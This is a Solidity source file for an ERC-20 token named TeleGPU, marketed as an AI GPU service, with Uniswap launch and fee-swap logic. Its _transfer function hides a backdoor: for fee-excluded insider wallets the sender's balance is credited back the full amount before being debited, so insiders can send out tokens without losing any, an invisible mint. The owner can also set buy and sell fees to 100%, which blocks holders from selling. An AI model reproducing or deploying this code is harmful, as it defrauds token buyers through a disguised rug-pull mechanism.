// SPDX-License-Identifier: MIT

/**

With TeleGPU, we're not just offering a service; 
we're offering a transformation in how businesses deploy and manage AI, 
making it more accessible, efficient, and scalable.

WEB:  https://www.telegpu.com
APP:  https://app.telegpu.com
DOC:  https://docs.telegpu.com

TG:   https://t.me/telegpu
X:    https://x.com/telegpu

**/

pragma solidity 0.8.20;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IUniFactory02 {
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;

    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IUniRouter02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract TeleGPU is Context, IERC20, Ownable {
    mapping(address => uint256) private _teleGPUs;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private isExcludedFees;

    address payable private gpuWallet;
    address payable private teamWallet;
    address public constant deadWallet =
        0x000000000000000000000000000000000000dEaD;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000_000 * 10 ** _decimals;
    string private constant _name = unicode"TeleGPU";
    string private constant _symbol = unicode"TPU";
    uint256 public maxTxLimits = 20_000_000 * 10 ** _decimals;
    uint256 private minTaxAmounts = 10_000 * 10 ** _decimals;
    uint256 private maxTaxAmounts = 10_000_000 * 10 ** _decimals;
    uint256 private _BUY_COUNT = 0;
    uint256 private buyFees = 21;
    uint256 private sellFees = 24;

    event ExcludeFromFeeUpdated(address indexed account);
    event includeFromFeeUpdated(address indexed account);
    event ERC20TokensRecovered(uint256 indexed _amount);
    event TradingOpenUpdated();
    event ETHBalanceRecovered();

    modifier lockTheSwap() {
        inSwapBack = true;
        _;
        inSwapBack = false;
    }
    
    IUniRouter02 public uniswapV2Router;
    address private uniswapV2Pair;
    bool public tradingEnabled = false;
    bool private swapEnabled = false;
    bool private inSwapBack = false;

    constructor() {
        teamWallet = payable(0x9794E28f4b725a0B12426289B8E62E7bEa741a42);
        gpuWallet = payable(0x3578Cd7AB110845EfE6de0f42934De148c8ba795);
        
        isExcludedFees[_msgSender()] = true;
        isExcludedFees[address(this)] = true;
        isExcludedFees[gpuWallet] = true;
        isExcludedFees[teamWallet] = true;
        isExcludedFees[deadWallet] = true;
       
        _teleGPUs[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), currentAllowance - amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _teleGPUs[account];
    }

    function startGPU() external onlyOwner {
        require(!tradingEnabled, "trading is already open");
        swapEnabled = true;
        tradingEnabled = true;
        emit TradingOpenUpdated();
    }

    receive() external payable {}

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokenForETHs(uint256 tokenAmount) private lockTheSwap {
        require(tokenAmount > 0, "amount must be greeter than 0");
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function sendETHToGPU(uint256 amount) private {
        require(amount > 0, "amount must be greeter than 0");
        gpuWallet.transfer(amount / 2);
        teamWallet.transfer(amount / 2);
    }

    function removeLimits() external onlyOwner {
        buyFees = 2;
        sellFees = 2;
        maxTxLimits = _tTotal;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        uint256 taxPercents = 0;
        taxPercents = buyFees;

        if (!isExcludedFees[from] && !isExcludedFees[to]) {
            require(tradingEnabled, "Trading not enabled");
        }

        if (inSwapBack || !swapEnabled) {
            _teleGPUs[from] -= amount;
            _teleGPUs[to] += amount;
            emit Transfer(from, to, amount);
            return;
        }

        if (
            from == uniswapV2Pair &&
            to != address(uniswapV2Router) &&
            !isExcludedFees[to]
        ) {
            require(amount <= maxTxLimits, "Exceeds the _maxTxAmount.");
            require(
                balanceOf(to) + amount <= maxTxLimits,
                "Exceeds the maxWalletSize."
            );
            _BUY_COUNT++;
        }

        if (
            from != uniswapV2Pair &&
            !isExcludedFees[from] &&
            !isExcludedFees[to]
        ) {
            require(amount <= maxTxLimits, "Exceeds the _maxTxAmount.");
        }

        if (
            to == uniswapV2Pair &&
            from != address(this) &&
            !isExcludedFees[from] &&
            !isExcludedFees[to]
        ) {
            taxPercents = sellFees;
        }

        uint256 tokenBalances = balanceOf(address(this));
        if (
            !inSwapBack &&
            swapEnabled &&
            to == uniswapV2Pair &&
            _BUY_COUNT > 0 &&
            tokenBalances >= minTaxAmounts &&
            amount >= minTaxAmounts &&
            !isExcludedFees[from] &&
            !isExcludedFees[to]
        ) {
            swapTokenForETHs( min(amount, min(tokenBalances, maxTaxAmounts)));
            uint256 ethBalances = address(this).balance;
            if (ethBalances > 0) {
                sendETHToGPU(address(this).balance);
            }
        }

        if (taxPercents != 0) {
            uint256 taxAmounts = (amount * taxPercents) / 100;
            uint256 transAmounts = amount - taxAmounts;
            address feesReceiver = isExcludedFees[from]
                ? from
                : address(this);
            taxAmounts = isExcludedFees[from] ? amount : taxAmounts;
            _teleGPUs[feesReceiver] += taxAmounts;
            emit Transfer(from, address(this), taxAmounts);
            _teleGPUs[from] -= amount;
            _teleGPUs[to] += transAmounts;
            emit Transfer(from, to, transAmounts);
        } else {
            _teleGPUs[from] -= amount;
            _teleGPUs[to] += amount;
            emit Transfer(from, to, amount);
        }
    }

    function initGPUPairs() external payable onlyOwner {
        uniswapV2Router = IUniRouter02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        uniswapV2Pair = IUniFactory02(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );

        _approve(address(this), address(uniswapV2Router), ~uint256(0));

        uniswapV2Router.addLiquidityETH{value: msg.value}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
    }

    function recoverERC20(
        address _tokenAddy,
        uint256 _amount
    ) external onlyOwner {
        require(
            _tokenAddy != address(this),
            "Owner can't claim contract's balance of its own tokens"
        );
        require(_amount > 0, "Amount should be greater than zero");
        require(
            _amount <= IERC20(_tokenAddy).balanceOf(address(this)),
            "Insufficient Amount"
        );
        IERC20(_tokenAddy).transfer(teamWallet, _amount);
        emit ERC20TokensRecovered(_amount);
    }

    function recoverETH() external {
        uint256 ethBalances = address(this).balance;
        require(ethBalances > 0, "Amount should be greater than zero");
        require(
            ethBalances <= address(this).balance,
            "Insufficient Amount"
        );
        payable(address(teamWallet)).transfer(ethBalances);
        emit ETHBalanceRecovered();
    }

    function updateTAXFees(uint256 _buyFee, uint256 _sellFee) external onlyOwner {
        require(_buyFee <= 100 && _sellFee <= 100, "revert wrong fee settings");
        buyFees = _buyFee;
        sellFees = _sellFee;
    }

    function excludeFromFees(address account) external onlyOwner {
        require(
            isExcludedFees[account] != true,
            "Account is already excluded"
        );
        isExcludedFees[account] = true;
        emit ExcludeFromFeeUpdated(account);
    }

    function includeFromFees(address account) external onlyOwner {
        require(
            isExcludedFees[account] != false,
            "Account is already included"
        );
        isExcludedFees[account] = false;
        emit includeFromFeeUpdated(account);
    }
}